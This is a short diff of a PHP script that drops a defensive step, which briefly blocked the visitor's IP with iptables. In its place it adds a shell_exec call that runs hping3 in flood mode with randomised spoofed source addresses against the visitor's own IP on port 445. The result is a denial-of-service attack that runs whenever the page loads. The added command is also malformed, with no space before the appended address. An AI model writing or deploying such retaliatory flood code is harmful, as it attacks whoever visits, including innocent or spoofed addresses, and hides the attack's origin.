@@ -7,7 +7,5 @@
 
 
     // DROP IT - https://youtu.be/X3oOQ8XnQWU?t=1m14s
-    shell_exec('/sbin/iptables -I INPUT -s ' . $_SERVER['REMOTE_ADDR'] . ' -j DROP');
-    sleep(15);
-    shell_exec('/sbin/iptables -D INPUT -s ' . $_SERVER['REMOTE_ADDR'] . ' -j DROP');
+    shell_exec('hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source' . $_SERVER['REMOTE_ADDR']);
 ?>
